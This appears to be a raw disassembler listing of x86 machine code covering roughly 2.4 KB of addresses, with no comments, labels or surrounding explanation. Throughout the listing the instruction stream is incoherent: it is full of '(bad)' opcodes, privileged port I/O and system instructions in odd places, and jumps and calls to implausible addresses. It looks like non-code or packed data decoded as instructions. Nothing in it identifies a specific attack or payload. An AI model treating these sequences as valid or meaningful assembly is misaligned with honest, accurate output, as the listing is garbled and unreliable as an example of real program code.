  429b7e:	mov    esi,DWORD PTR [eax]
  429b80:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  429b87:	test   DWORD PTR [edi-0x8],edx
  429b8a:	inc    esi
  429b8b:	inc    ebp
  429b8c:	add    BYTE PTR [esi],bh
  429b8e:	push   0x8b809c
  429b93:	in     al,dx
  429b94:	inc    ebp
  429b95:	push   ebp
  429b96:	mov    esi,DWORD PTR [ebx]
  429b98:	cld    
  429b99:	add    eax,DWORD PTR [eax+0xf013b]
  429b9f:	adc    al,0x0
  429ba1:	add    bh,bh
  429ba3:	jmp    0xbf9cc0
  429ba8:	add    BYTE PTR [ebp+0x45],cl
  429bab:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  429bb1:	dec    ebp
  429bb2:	push   0x38033
  429bb7:	cmp    eax,DWORD PTR [eax]
  429bb9:	unpcklps xmm7,xmm0
  429bbc:	jne    0x429bbe
  429bbe:	dec    DWORD PTR [ebx+0x5545cc18]
  429bc4:	mov    DWORD PTR [ebx],esi
  429bc6:	shl    BYTE PTR [ebx],1
  429bc8:	inc    ebp
  429bc9:	add    ecx,DWORD PTR [ecx+0x60fc803]
  429bcf:	retf   0x5575
  429bd2:	dec    DWORD PTR [ebx-0x5ba17e8]
  429bd8:	(bad)  
  429bd9:	stc    
  429bda:	in     al,dx
  429bdb:	or     al,0x85
  429bdd:	dec    ebp
  429bde:	clc    
  429bdf:	xor    eax,DWORD PTR [ebp+0x3]
  429be2:	mov    ebp,ecx
  429be4:	rol    BYTE PTR [eax],1
  429be6:	inc    ebp
  429be7:	add    BYTE PTR [eax-0x7747ab3],bh
  429bed:	clc    
  429bee:	inc    ebp
  429bef:	retf   
  429bf0:	mov    edx,ebx
  429bf2:	in     al,dx
  429bf3:	(bad)  
  429bf4:	retf   
  429bf5:	into   
  429bf6:	into   
  429bf7:	scas   eax,DWORD PTR es:[edi]
  429bf8:	dec    ebp
  429bf9:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  429bff:	sub    ecx,esi
  429c01:	cmp    ecx,DWORD PTR [ebp+0x77]
  429c04:	(bad)  
  429c05:	mov    edi,eax
  429c07:	int3   
  429c08:	test   DWORD PTR [ecx-0x74baff08],ecx
  429c0e:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  429c15:	xor    eax,DWORD PTR [ebp+0x4503f803]
  429c1b:	rdtsc  
  429c1d:	retf   0x559c
  429c20:	(bad)  
  429c21:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  429c28:	inc    ebp
  429c29:	add    eax,0xeb9c4d3f
  429c2e:	(bad)  
  429c2f:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  429c35:	xor    ecx,DWORD PTR [ebp+0x33]
  429c38:	mov    eax,DWORD PTR [ebx]
  429c3a:	call   0xce526742
  429c3f:	retf   0x55d1
  429c42:	test   BYTE PTR [ebx-0x5ff17fe],cl
  429c48:	jmp    0x429c43
  429c4a:	add    BYTE PTR ds:0xebf44d8b,al
  429c50:	push   ebp
  429c51:	mov    ebp,DWORD PTR [ebx]
  429c53:	mov    eax,0x33f8558b
  429c58:	retf   
  429c59:	xor    ecx,esi
  429c5b:	add    edx,ecx
  429c5d:	add    eax,DWORD PTR [edx+0xca010f]
  429c63:	push   ebp
  429c64:	dec    ebp
  429c65:	mov    ecx,DWORD PTR [ebx-0x34050718]
  429c6b:	stc    
  429c6c:	rol    DWORD PTR ds:0xebce4dd6,cl
  429c72:	scas   eax,DWORD PTR es:[edi]
  429c73:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  429c79:	xor    ebp,DWORD PTR [ebx]
  429c7b:	xor    edi,DWORD PTR [ebx]
  429c7d:	add    esi,DWORD PTR [edi+0x3]
  429c80:	mov    ecx,DWORD PTR [edi]
  429c82:	clc    
  429c83:	retf   0x55cb
  429c86:	into   
  429c87:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  429c8e:	test   al,0x4d
  429c90:	push   ebp
  429c91:	jbe    0x429cc6
  429c93:	mov    esi,DWORD PTR [ebx]
  429c95:	mov    al,0x3
  429c97:	push   ebp
  429c98:	add    esi,DWORD PTR [ebx]
  429c9a:	rdpmc  
  429c9c:	retf   0x5503
  429c9f:	add    ecx,DWORD PTR [ebx-0x53517f1]
  429ca5:	dec    ebp
  429ca6:	stc    
  429ca7:	mov    ecx,DWORD PTR [eax]
  429ca9:	or     BYTE PTR [ebp+0x4d],cl
  429cac:	jmp    0x1369d3c
  429cb1:	dec    ebp
  429cb2:	dec    ebp
  429cb3:	(bad)  
  429cb4:	mov    ebx,esp
  429cb6:	clc    
  429cb7:	test   ebx,ecx
  429cb9:	clc    
  429cba:	ror    DWORD PTR [ebp-0x2a],cl
  429cbd:	mov    esi,ecx
  429cbf:	lock scas eax,DWORD PTR es:[edi]
  429cc1:	inc    ebp
  429cc2:	mov    esi,DWORD PTR [ebx]
  429cc4:	hlt    
  429cc5:	pushf  
  429cc6:	jge    0x429c53
  429cc8:	sub    ebx,esp
  429cca:	cmp    ecx,ebx
  429ccc:	ja     0x429c9c
  429cce:	mov    ebp,DWORD PTR [eax-0x58]
  429cd1:	dec    ebp
  429cd2:	xor    ecx,DWORD PTR [di+0x3]
  429cd6:	mov    esp,esp
  429cd8:	clc    
  429cd9:	push   ebp
  429cda:	retf   
  429cdb:	mov    dl,bl
  429cdd:	adc    esi,edx
  429cdf:	jb     0x429caf
  429ce1:	add    BYTE PTR [edi-0xb7474b3],ch
  429ce7:	lock jge 0x429cb5
  429cea:	sub    ecx,DWORD PTR [ebp+0x3b]
  429ced:	mov    esi,DWORD PTR [edi-0x20]
  429cf0:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  429cf7:	mov    BYTE PTR [ebx-0x34b20729],cl
  429cfd:	mov    edx,ebx
  429cff:	lock (bad) 
  429d01:	ror    esi,cl
  429d03:	push   ebp
  429d04:	scas   eax,DWORD PTR es:[edi]
  429d05:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  429d0b:	sahf   
  429d0c:	sub    esi,DWORD PTR [edx]
  429d0e:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  429d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d15:	xor    esp,DWORD PTR [ebx]
  429d17:	add    ecx,DWORD PTR [ebp-0x1c]
  429d1a:	mov    edi,DWORD PTR [ebp-0x8]
  429d1d:	mov    bl,cl
  429d1f:	cmp    dl,bl
  429d21:	jb     0x429cf1
  429d23:	add    dh,dl
  429d25:	dec    ebp
  429d26:	scas   eax,DWORD PTR es:[edi]
  429d27:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  429d2d:	shr    DWORD PTR [ebx],cl
  429d2f:	into   
  429d30:	cmp    edx,esi
  429d32:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  429d38:	dec    ebp
  429d39:	dec    ebp
  429d3a:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  429d40:	retf   
  429d41:	xor    edx,esi
  429d43:	add    ecx,esi
  429d45:	imul   ecx,edx
  429d48:	mov    DWORD PTR [ebp+0x8],edx
  429d4b:	xor    ecx,DWORD PTR [ebp+0x2b]
  429d4e:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  429d54:	add    esi,DWORD PTR [ebx]
  429d56:	rol    BYTE PTR [ebx],0x45
  429d59:	sysexit 
  429d5b:	xlat   BYTE PTR ds:[ebx]
  429d5c:	pushf  
  429d5d:	jge    0x429ce8
  429d5f:	xor    esp,eax
  429d61:	sub    eax,DWORD PTR [ebp-0x73]
  429d64:	(bad)  
  429d65:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  429d6c:	dec    ebp
  429d6d:	xchg   BYTE PTR [ebx],dh
  429d6f:	inc    DWORD PTR [ebx]
  429d71:	(bad)  
  429d72:	jmp    0x429dc1
  429d74:	mov    ecx,DWORD PTR [ebx-0x34341324]
  429d7a:	dec    ebp
  429d7b:	into   
  429d7c:	mov    ebp,DWORD PTR [edi-0x23737420]
  429d82:	sahf   
  429d83:	shl    DWORD PTR [edx],cl
  429d85:	retf   0x5588
  429d88:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429d8e:	add    eax,DWORD PTR [eax]
  429d90:	in     al,0x4d
  429d92:	push   ebp
  429d93:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  429d99:	bound  eax,QWORD PTR [eax]
  429d9b:	int    0x4d
  429d9d:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  429da3:	dec    ebp
  429da4:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  429daa:	jge    0x429d7a
  429dac:	mov    BYTE PTR [edi+0xf723b3a],ch
  429db2:	add    cl,dh
  429db4:	dec    ebp
  429db5:	dec    DWORD PTR [ebx-0x2c032301]
  429dbb:	inc    ebp
  429dbc:	push   ebp
  429dbd:	dec    DWORD PTR [ebx-0x73ff1f34]
  429dc3:	lea    ebx,[esi-0x7400cdac]
  429dc9:	push   eax
  429dca:	mov    ah,0x45
  429dcc:	push   ebp
  429dcd:	mov    esi,DWORD PTR [ebx]
  429dcf:	les    esi,FWORD PTR [ebx]
  429dd1:	add    BYTE PTR [ebx],al
  429dd3:	inc    DWORD PTR [ebx]
  429dd5:	mov    ecx,DWORD PTR [edi]
  429dd7:	cld    
  429dd8:	retf   0x4d80
  429ddb:	add    DWORD PTR [ecx+0x4d30e400],ecx
  429de1:	jne    0x429d6e
  429de3:	(bad)  
  429de4:	in     al,dx
  429de5:	ror    bl,1
  429de7:	clc    
  429de8:	into   
  429de9:	add    BYTE PTR [edi-0xf2f7475],ch
  429def:	not    bl
  429df1:	adc    al,0xca
  429df3:	inc    ebp
  429df4:	push   ebp
  429df5:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  429dfb:	push   0xaf80d6
  429e00:	mov    eax,DWORD PTR [eax]
  429e02:	fdiv   st(7),st
  429e04:	sti    
  429e05:	sbb    dh,cl
  429e07:	pop    esi
  429e08:	xchg   esp,eax
  429e09:	leave  
  429e0a:	sahf   
  429e0b:	add    al,0x32
  429e0d:	push   ebp
  429e0e:	cmp    ebp,esp
  429e10:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  429e14:	dec    DWORD PTR [ecx-0x740f0375]
  429e1a:	push   ebp
  429e1b:	cld    
  429e1c:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  429e22:	retf   0x558b
  429e25:	clc    
  429e26:	xor    esi,eax
  429e28:	add    esi,DWORD PTR [ebp-0x75]
  429e2b:	(bad)  
  429e2c:	hlt    
  429e2d:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  429e34:	mov    DWORD PTR [edx],ecx
  429e36:	hlt    
  429e37:	(bad)  
  429e38:	dec    ebp
  429e39:	add    dh,BYTE PTR [ebx]
  429e3b:	leave  
  429e3c:	mov    edx,0xffec8d55
  429e41:	push   ecx
  429e42:	rol    DWORD PTR [ebp+0x55],1
  429e45:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  429e4b:	mov    eax,0xf8030b33
  429e50:	lar    ecx,di
  429e53:	push   ebp
  429e54:	retf   0x863b
  429e57:	jne    0x429e56
  429e59:	mov    edi,edi
  429e5b:	or     BYTE PTR [ebp+0x41],dh
  429e5e:	mov    esp,eax
  429e60:	cld    
  429e61:	inc    eax
  429e62:	mov    al,0x29
  429e64:	add    DWORD PTR [ecx+0x0],eax
  429e67:	loope  0x429dee
  429e69:	inc    ecx
  429e6a:	call   eax
  429e6c:	inc    edx
  429e6e:	mov    eax,DWORD PTR [eax]
  429e70:	cld    
  429e71:	mov    eax,DWORD PTR [eax+0x8d0151]
  429e77:	clc    
  429e78:	xor    BYTE PTR [ebp+0x45],al
  429e7b:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  429e81:	loopne 0x429e82
  429e83:	mov    edi,edi
  429e85:	mov    ecx,eax
  429e87:	clc    
  429e88:	jne    0x429e5a
  429e8a:	call   0x83af93
  429e8f:	sub    DWORD PTR [ebp+0x45],esi
  429e92:	test   esi,eax
  429e94:	je     0x429e97
  429e96:	mov    eax,esi
  429e98:	cld    
  429e99:	or     DWORD PTR [eax+0x401c9],eax
  429e9f:	push   ebp
  429ea0:	add    ah,ch
  429ea2:	add    BYTE PTR [ecx+0x6a],dl
  429ea5:	inc    ebp
  429ea6:	push   esi
  429ea7:	mov    DWORD PTR [eax-0x4],edx
  429eaa:	pop    edi
  429eab:	mov    ebx,DWORD PTR [ebx-0x4]
  429eae:	ret    0xbe
  429eb1:	push   es
  429eb2:	mov    ecx,DWORD PTR [ecx-0x77274af]
  429eb8:	clc    
  429eb9:	lock inc ebp
  429ebb:	jne    0x429f13
  429ebd:	(bad)  
  429ebe:	jne    0x429ec4
  429ec0:	mov    eax,0xf841ba66
  429ec5:	rol    BYTE PTR [esi],1
  429ec7:	(bad)  
  429ec8:	jne    0x429efb
  429eca:	cmp    eax,ebx
  429ecc:	pop    esi
  429ecd:	mov    ecx,DWORD PTR [eax]
  429ecf:	push   ecx
  429ed0:	inc    ecx
  429ed1:	lea    edi,[eax+edi*8+0x42]
  429ed5:	inc    ebp
  429ed6:	ror    DWORD PTR [ebx-0x408303be],0x41
  429edd:	xchg   edx,ebp
  429edf:	mov    ebx,eax
  429ee1:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  429ee7:	or     edi,eax
  429ee9:	inc    ebp
  429eea:	inc    ebp
  429eeb:	(bad)  
  429eec:	mov    ecx,DWORD PTR [eax]
  429eee:	cld    
  429eef:	(bad)  
  429ef0:	jmp    0x429ef3
  429ef2:	mov    eax,esi
  429ef4:	mov    DWORD PTR ds:0x4f8c98b,eax
  429efa:	rcl    BYTE PTR [esi+0xf],1
  429efd:	iret   
  429efe:	inc    ebp
  429eff:	leave  
  429f00:	(bad)  
  429f01:	dec    DWORD PTR [ecx]
  429f03:	mov    eax,esi
  429f05:	mov    eax,DWORD PTR [edi]
  429f07:	mov    dh,0xd1
  429f0a:	push   es
  429f0b:	nop
  429f0c:	(bad)  
  429f0d:	inc    DWORD PTR [ebx]
  429f0f:	push   esi
  429f10:	leave  
  429f11:	iret   
  429f12:	add    al,0x46
  429f14:	push   ebp
  429f15:	in     eax,0xec
  429f17:	push   ebp
  429f18:	push   ecx
  429f19:	inc    DWORD PTR [ebp+0x56]
  429f1c:	mov    DWORD PTR [esi-0x4],eax
  429f1f:	loope  0x429f76
  429f21:	sbb    BYTE PTR [eax+0x7c6daff],bh
  429f27:	add    al,BYTE PTR [edx]
  429f29:	mov    edx,DWORD PTR [ebp-0x17]
  429f2c:	cmp    edi,esi
  429f2e:	jne    0x429f2f
  429f30:	(bad)  
  429f31:	push   esi
  429f32:	pop    es
  429f33:	push   ebp
  429f34:	mov    ebp,esp
  429f36:	or     BYTE PTR [ebp+0x41],al
  429f39:	add    edi,edx
  429f3b:	sub    BYTE PTR [eax-0x4],al
  429f3e:	shl    BYTE PTR [ebp-0x3e],0x1
  429f42:	add    BYTE PTR [ebx+ecx*4],bl
  429f45:	mov    edx,DWORD PTR [ecx+0x14]
  429f48:	lea    edx,[edx-0x1ba7508]
  429f4e:	push   esi
  429f4f:	enter  0xd375,0xb8
  429f53:	test   DWORD PTR [esi],0x6ce0750
  429f59:	enter  0xd375,0x3b
  429f5d:	neg    DWORD PTR [esi+0x50]
  429f60:	or     cl,dl
  429f62:	inc    edx
  429f63:	(bad)  
  429f64:	in     eax,dx
  429f65:	in     al,dx
  429f66:	(bad)  
  429f67:	sub    eax,DWORD PTR [ebx]
  429f69:	inc    eax
  429f6a:	in     eax,dx
  429f6b:	push   eax
  429f6c:	add    dl,BYTE PTR [eax-0x37]
  429f6f:	push   edi
  429f70:	push   ebp
  429f71:	imul   ah
  429f73:	adc    DWORD PTR [ecx-0x1],0x45
  429f77:	add    BYTE PTR [ecx+0x55d3fc00],cl
  429f7d:	lea    edi,[eax-0x7fff4ca]
  429f83:	mov    eax,0x4550402
  429f88:	cmp    ebp,ecx
  429f8a:	jne    0x429f37
  429f8c:	mov    eax,DWORD PTR ds:0x241e808
  429f92:	loope  0x429f94
  429f94:	inc    eax
  429f95:	stc    
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	ss inc ecx
  429f99:	aas    
  429f9a:	in     eax,0x7d
  429f9c:	ret    0x8b
  429f9f:	lock mov edi,DWORD PTR [ebp-0x18]
  429fa3:	and    edi,edi
  429fa5:	mov    edi,edi
  429fa7:	call   0xe410a083
  429fac:	push   es
  429fad:	add    al,ch
  429faf:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  429fb6:	(bad)  
  429fb7:	hlt    
  429fb8:	add    eax,0xffd3e87d
  429fbd:	cmp    bh,0x8
  429fc0:	(bad)  
  429fc1:	fld    DWORD PTR [esi]
  429fc3:	out    dx,al
  429fc4:	call   0xffa19ecc
  429fc9:	cmp    al,0x46
  429fcb:	shr    edx,0x8
  429fce:	(bad)  
  429fcf:	pop    es
  429fd0:	fisttp QWORD PTR [ebp+0xe577eff]
  429fd6:	push   ebx
  429fd7:	add    BYTE PTR [ebx+0x24008b56],cl
  429fdd:	add    BYTE PTR [ebp+0x50],al
  429fe0:	push   eax
  429fe1:	add    DWORD PTR [ebx+0x757d1834],ecx
  429fe7:	sub    edx,DWORD PTR [esi-0x24]
  429fea:	jne    0x429fa2
  429fec:	lods   eax,DWORD PTR ds:[esi]
  429fed:	mov    edx,DWORD PTR [edx-0x34]
  429ff0:	dec    esi
  429ff1:	out    0x83,eax
  429ff3:	into   
  429ff4:	push   edi
  429ff6:	loopne 0x429fc6
  429ff8:	shr    BYTE PTR [edx+ecx*4+0x0],1
  429ffc:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  42a003:	rol    DWORD PTR [edx],0x8
  42a006:	mov    esp,ecx
  42a008:	cmp    DWORD PTR [ebx],0xc
  42a00b:	mov    esi,0x5001c0
  42a010:	push   eax
  42a011:	push   cs
  42a012:	push   eax
  42a013:	(bad)  
  42a014:	sub    edx,edi
  42a016:	push   esi
  42a017:	adc    al,0xcb
  42a019:	ins    DWORD PTR es:[edi],dx
  42a01a:	mov    eax,0x203e8
  42a01f:	add    al,ah
  42a021:	inc    esi
  42a022:	mov    al,ch
  42a024:	pop    es
  42a025:	add    DWORD PTR [eax],0x1
  42a028:	add    dh,al
  42a02a:	add    ah,ch
  42a02c:	rol    DWORD PTR [edx-0xd],1
  42a02f:	cli    
  42a030:	push   0x4a
  42a032:	pop    ecx
  42a033:	retf   0xfe6
  42a036:	add    BYTE PTR [ebx-0x4e72f41e],al
  42a03c:	(bad)  
  42a03d:	dec    BYTE PTR [ebx+0x45b1fc72]
  42a043:	(bad)  
  42a044:	sub    ebp,DWORD PTR [ebx]
  42a046:	and    al,0x52
  42a048:	(bad)  
  42a049:	dec    edi
  42a04a:	inc    ebp
  42a04b:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  42a052:	add    BYTE PTR [ebp-0x7b],dh
  42a055:	pop    eax
  42a056:	add    BYTE PTR [edx+0x0],bl
  42a059:	pop    edx
  42a05a:	dec    ebp
  42a05b:	jmp    DWORD PTR [ebx]
  42a05d:	and    al,0xec
  42a05f:	push   edx
  42a060:	out    0x64,eax
  42a062:	jmp    0xd3f49667
  42a067:	jmp    0x42a0c1
  42a069:	mov    al,0xfe
  42a06b:	dec    BYTE PTR [ebp-0x18fd8018]
  42a071:	add    BYTE PTR [esi+ebp*1],bh
  42a074:	pop    edx
  42a075:	icebp  
  42a076:	mov    eax,cs
  42a078:	ins    BYTE PTR es:[edi],dx
  42a079:	adc    eax,0x75510000
  42a07e:	mov    esi,0x70158
  42a083:	or     DWORD PTR [eax-0x74f48dfe],esi
  42a089:	mov    edi,esp
  42a08b:	cld    
  42a08c:	jge    0x42a103
  42a08e:	(bad)  
  42a090:	aas    
  42a091:	and    al,0x6d
  42a093:	adc    cl,0x1
  42a096:	mov    eax,DWORD PTR [eax]
  42a098:	and    ecx,DWORD PTR [ebx-0x167203fd]
  42a09e:	dec    ebp
  42a09f:	add    eax,ebp
  42a0a1:	add    BYTE PTR [edx],al
  42a0a3:	fadd   DWORD PTR [eax]
  42a0a5:	stc    
  42a0a6:	enter  0xee00,0x8b
  42a0aa:	sbb    eax,0x1
  42a0ad:	sbb    esi,ecx
  42a0af:	in     al,0x0
  42a0b1:	in     eax,dx
  42a0b2:	add    BYTE PTR [eax],al
  42a0b4:	jne    0x42a041
  42a0b6:	cmp    edx,esp
  42a0b8:	jb     0x42a0c3
  42a0ba:	jmp    0x42a131
  42a0bc:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  42a0c2:	add    BYTE PTR [ebx+0x4d83d840],cl
  42a0c8:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  42a0ce:	jb     0x42a059
  42a0d0:	pop    edx
  42a0d1:	fadd   QWORD PTR [ebx-0x7445faa1]
  42a0d7:	or     dh,BYTE PTR [edx+0x0]
  42a0da:	inc    edx
  42a0db:	or     dl,bh
  42a0dd:	xlat   BYTE PTR ds:[ebx]
  42a0de:	dec    edx
  42a0df:	push   edi
  42a0e0:	add    al,0x7
  42a0e2:	leave  
  42a0e3:	rol    DWORD PTR [edx+eax*1],0x7
  42a0e7:	add    ecx,ecx
  42a0e9:	mov    edx,ecx
  42a0eb:	int3   
  42a0ec:	jmp    0x42a0ac
  42a0ee:	mov    al,0x0
  42a0f0:	(bad)  
  42a0f1:	jne    0x42a0db
  42a0f3:	mov    eax,DWORD PTR [edx]
  42a0f5:	call   0xc1571dfa
  42a0fa:	pop    edi
  42a0fb:	add    ebx,DWORD PTR [ecx-0x37]
  42a0fe:	pop    ecx
  42a0ff:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  42a106:	push   es
  42a107:	mov    eax,DWORD PTR [eax]
  42a109:	int3   
  42a10a:	add    ch,al
  42a10c:	jae    0x42a0f6
  42a10e:	int    0x1
  42a110:	enter  0x3000,0x18
  42a114:	add    BYTE PTR [ebp+0x75],al
  42a117:	mov    esi,DWORD PTR [eax-0x171f0134]
  42a11d:	push   0x2
  42a11f:	pop    ecx
  42a120:	add    BYTE PTR [eax],cl
  42a122:	push   ebx
  42a123:	lea    edi,[edi+eax*2]
  42a126:	mov    al,0x1
  42a128:	jb     0x42a12a
  42a12a:	mov    al,0x10
  42a12c:	push   eax
  42a12d:	add    al,0x75
  42a12f:	add    BYTE PTR [ebx],ch
  42a131:	add    ebx,esp
  42a133:	int3   
  42a134:	jne    0x42a146
  42a136:	movsx  edx,cl
  42a139:	add    DWORD PTR [eax],eax
  42a13b:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  42a142:	mov    gs,edi
  42a144:	add    BYTE PTR [eax-0x50],ch
  42a147:	add    al,ch
  42a149:	mov    eax,DWORD PTR [ecx]
  42a14b:	sub    eax,DWORD PTR [eax]
  42a14d:	jb     0x42a1c4
  42a14f:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42a153:	jge    0x42a13d
  42a155:	add    al,0x1
  42a157:	add    DWORD PTR [eax],0x0
  42a15a:	jne    0x42a15c
  42a15c:	je     0x42a1a3
  42a15e:	mov    eax,DWORD PTR [edi]
  42a160:	ror    BYTE PTR [ebp+0x4d],1
  42a163:	or     DWORD PTR [ecx+0x4d03d004],0x3
  42a16a:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  42a170:	mov    DWORD PTR [ebx],ebp
  42a172:	fadd   DWORD PTR [eax+0x75]
  42a175:	inc    eax
  42a176:	pop    eax
  42a177:	lea    ebx,[ecx+0x4f]
  42a17a:	push   0xb1000003
  42a17f:	out    dx,eax
  42a180:	add    ebp,DWORD PTR [edx+edx*2]
  42a183:	add    BYTE PTR [ebx+ecx*4],bh
  42a186:	mov    ch,BYTE PTR [ebx]
  42a188:	jb     0x42a1fc
  42a18a:	add    al,0x89
  42a18c:	push   eax
  42a18d:	call   0x842aeeff
  42a192:	add    DWORD PTR [eax+eax*1],eax
  42a195:	jae    0x42a1ab
  42a197:	icebp  
  42a198:	inc    ebp
  42a199:	mov    eax,DWORD PTR gs:[ecx]
  42a19c:	int3   
  42a19d:	out    dx,al
  42a19e:	loopne 0x42a1ed
  42a1a0:	sub    eax,DWORD PTR [edx]
  42a1a2:	push   0xffffff83
  42a1a4:	pop    esi
  42a1a5:	push   cs
  42a1a6:	jl     0x42a1c1
  42a1a8:	add    al,0xaf
  42a1aa:	xor    eax,0x832b6d00
  42a1af:	mov    eax,DWORD PTR [edx]
  42a1b1:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42a1b7:	ror    DWORD PTR [ebx+0x7dc8e803],1
  42a1bd:	inc    ebp
  42a1be:	shr    ebx,0x3
  42a1c1:	or     DWORD PTR [eax],0x4
  42a1c4:	push   0xffffffa5
  42a1c6:	pop    esi
  42a1c7:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  42a1ce:	jmp    0x42a22d
  42a1d0:	mov    edi,0xff0272
  42a1d5:	fdivr  QWORD PTR [ebp+0x5d]
  42a1d8:	push   0x4e
  42a1da:	pop    ecx
  42a1db:	call   0x42e5e0
  42a1e0:	mov    DWORD PTR [ebx],eax
  42a1e2:	in     al,0xc8
  42a1e4:	rol    BYTE PTR [ebp-0x75],0xc1
  42a1e8:	call   0xaca3c9
  42a1ed:	pop    esi
  42a1ee:	enter  0xceff,0x8b
  42a1f2:	repz mov ecx,DWORD PTR [ebp-0x34]
  42a1f6:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  42a1fd:	je     0x42a1ff
  42a1ff:	or     DWORD PTR [ebx-0x74183b24],eax
  42a205:	jne    0x42a1eb
  42a207:	jmp    0x42a202
  42a209:	push   DWORD PTR [edx-0x24]
  42a20c:	push   0x4d
  42a20e:	pop    ecx
  42a20f:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42a213:	jge    0x42a21b
  42a215:	mov    eax,eax
  42a217:	sub    ebp,DWORD PTR [edx+0x24]
  42a21a:	pop    esi
  42a21b:	inc    ebp
  42a21c:	mov    esp,0x8b6077
  42a221:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42a227:	lods   al,BYTE PTR ds:[esi]
  42a228:	add    BYTE PTR [ebx],bh
  42a22a:	enter  0xce73,0x49
  42a22e:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42a236:	stc    
  42a237:	jge    0x42a2ab
  42a239:	jnp    0xdd42259a
  42a23f:	call   0xc5a315
  42a244:	fadd   st(0),st
  42a246:	dec    esi
  42a247:	ins    BYTE PTR es:[edi],dx
  42a248:	stc    
  42a249:	cmp    al,0x73
  42a24b:	push   ebp
  42a24c:	mov    eax,0xf8028b
  42a251:	jne    0x42a214
  42a253:	mov    esi,ecx
  42a255:	mov    esp,DWORD PTR [ebp+0x2c]
  42a258:	add    edi,DWORD PTR [ebp-0x24]
  42a25b:	sub    esp,eax
  42a25d:	and    al,0x45
  42a25f:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42a265:	sbb    al,0xee
  42a267:	pop    esi
  42a268:	call   0x82a298
  42a26d:	fsubr  st,st(3)
  42a26f:	sti    
  42a270:	add    BYTE PTR gs:[ecx],bh
  42a273:	add    eax,esp
  42a275:	add    DWORD PTR [esi],eax
  42a277:	rol    DWORD PTR [ebp+0x8],0x29
  42a27b:	mov    esp,eax
  42a27d:	clc    
  42a27e:	jne    0x42a2f5
  42a280:	mov    eax,0x8b0673
  42a285:	loopne 0x42a2cc
  42a287:	loopne 0x42a212
  42a289:	lods   al,BYTE PTR ds:[esi]
  42a28a:	int3   
  42a28b:	inc    ebp
  42a28c:	mov    DWORD PTR gs:[eax+edi*8],eax
  42a290:	add    al,0xc3
  42a292:	sub    ecx,DWORD PTR [ebp+0x47]
  42a295:	(bad)  
  42a297:	shr    BYTE PTR [ebp-0x1f],0xe8
  42a29b:	add    eax,DWORD PTR [eax]
  42a29d:	call   0x64463a2
  42a2a2:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42a2a8:	dec    esi
  42a2a9:	ins    DWORD PTR es:[edi],dx
  42a2aa:	in     al,dx
  42a2ab:	lea    eax,[eax]
  42a2ad:	inc    ebp
  42a2ae:	inc    ebp
  42a2af:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42a2b5:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  42a2bf:	and    al,0xdc
  42a2c1:	ror    DWORD PTR [edx+0x24],0xf7
  42a2c5:	or     BYTE PTR [ebp+0x4c],dh
  42a2c8:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  42a2cc:	stos   BYTE PTR es:[edi],al
  42a2cd:	adc    edx,edi
  42a2cf:	inc    esp
  42a2d0:	add    edi,DWORD PTR [eax]
  42a2d2:	jne    0x42a2b7
  42a2d4:	mov    DWORD PTR [eax-0x7449db04],ecx
  42a2da:	cmp    ecx,DWORD PTR [edi]
  42a2dc:	sub    BYTE PTR [ebp-0x7e],dl
  42a2df:	sar    ebp,0xb
  42a2e2:	jmp    FWORD PTR [edi+0x2400392a]
  42a2e8:	sub    esi,DWORD PTR [ebx-0x73]
  42a2eb:	mov    esp,DWORD PTR [ecx+edi*4]
  42a2ee:	mov    ecx,DWORD PTR [eax]
  42a2f0:	and    BYTE PTR [eax],al
  42a2f2:	jne    0x42a2be
  42a2f4:	sub    ebp,ecx
  42a2f6:	sbb    BYTE PTR [esi+0x32],ah
  42a2f9:	dec    ebp
  42a2fa:	push   ebp
  42a2fb:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  42a301:	ret    
  42a302:	mov    edx,ebp
  42a304:	leave  
  42a305:	sub    DWORD PTR [esi+0x24],ebx
  42a308:	ret    0x2b
